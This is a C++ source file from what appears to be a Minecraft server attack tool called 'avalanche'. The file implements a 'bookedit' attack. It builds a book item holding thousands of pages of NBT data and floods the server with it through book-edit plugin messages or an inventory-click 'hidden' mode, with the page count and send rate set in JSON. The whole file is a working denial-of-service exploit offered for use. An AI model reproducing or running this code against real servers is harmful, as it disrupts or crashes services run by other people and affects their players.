#include "AttackBookEdit.h"

#include <mclib/util/Utility.h>

namespace avalanche {

const char* AttackBookEdit::s_Name = "bookedit";
s32 AttackBookEdit::s_BookPages = 3000;
s32 AttackBookEdit::s_SendPerTick = 1;
std::string AttackBookEdit::s_AttackData;
mc::inventory::Slot AttackBookEdit::s_AttackItem;

AttackBookEdit::AttackBookEdit(mc::core::Client* client)
    : mc::protocol::packets::PacketHandler(client->GetDispatcher()),
      m_Client(client),
      m_Finished(false),
      m_Hidden(false),
      m_Transaction(false),
      m_TransactionIndex(1)
{
    
}

AttackBookEdit::~AttackBookEdit() {
    
}

void AttackBookEdit::HandlePacket(mc::protocol::packets::in::ConfirmTransactionPacket* packet) {
    m_Transaction = false;
}

void AttackBookEdit::OnCreate() {
    m_Client->RegisterListener(this);
    GetDispatcher()->RegisterHandler(mc::protocol::State::Play, mc::protocol::play::ConfirmTransaction, this);

    m_Finished = false;
    m_Transaction = false;
}

void AttackBookEdit::OnDestroy() {
    m_Client->UnregisterListener(this);
    GetDispatcher()->UnregisterHandler(this);
}

void AttackBookEdit::CreateAttack() {
    mc::nbt::NBT nbt;
    auto tag = &nbt.GetRoot();

    tag->SetName(L"tag");

    mc::nbt::TagPtr generation = std::make_shared<mc::nbt::TagInt>(L"generation", 0);
    mc::nbt::TagPtr author = std::make_shared<mc::nbt::TagString>(L"author", L"aaaaaa");
    mc::nbt::TagPtr title = std::make_shared<mc::nbt::TagString>(L"title", L"bbbbbb");

    auto pages = std::make_shared<mc::nbt::TagList>(L"pages", mc::nbt::TagType::String);

    for (s32 i = 0; i < s_BookPages; ++i) {
        std::wstring pageText = L"t";
        pages->AddItem(std::make_shared<mc::nbt::TagString>(L"", pageText));
    }

    tag->AddItem(mc::nbt::TagType::Int, generation);
    tag->AddItem(mc::nbt::TagType::String, author);
    tag->AddItem(mc::nbt::TagType::String, title);
    tag->AddItem(mc::nbt::TagType::List, pages);

    mc::DataBuffer buffer;
    mc::inventory::Slot book(387, 1, 0, nbt);
    buffer << book;

    s_AttackData = buffer.ToString();
    s_AttackItem = mc::inventory::Slot(387, 1, 0, nbt);
}

void AttackBookEdit::OnTick() {
    // Only start doing the attack once the world data is received.
    if (!m_Client->GetWorld()->GetChunk(mc::ToVector3i(m_Client->GetPlayerController()->GetPosition())))
        return;

    if (s_AttackData.empty()) {
        CreateAttack();
    }

    if (m_Hidden && m_Transaction) return;

    for (s32 i = 0; i < s_SendPerTick; ++i) {
        if (m_Hidden) {
            mc::protocol::packets::out::ClickWindowPacket packet(0, 36, 0, m_TransactionIndex++, 2, s_AttackItem);
            m_Client->GetConnection()->SendPacket(&packet);

            m_Transaction = true;
        } else {
            mc::protocol::packets::out::PluginMessagePacket packet(L"MC|BEdit", s_AttackData);
            m_Client->GetConnection()->SendPacket(&packet);
        }
    }

    m_Finished = true;
}

bool AttackBookEdit::ReadJSON(const Json::Value& attackNode) {
    auto&& methodNode = attackNode["method"];
    if (!methodNode.isString() || methodNode.asString() != s_Name)
        return false;

    auto&& pagesNode = attackNode["pages"];
    if (!pagesNode.isNull()) {
        s_BookPages = pagesNode.asInt();
    }

    auto&& sendPerTickNode = attackNode["send-per-tick"];
    if (!sendPerTickNode.isNull()) {
        s_SendPerTick = sendPerTickNode.asInt();
    }

    auto&& hiddenNode = attackNode["hidden"];
    if (hiddenNode.isBool()) {
        m_Hidden = hiddenNode.asBool();
    }

    return true;
}

} // ns avalanche
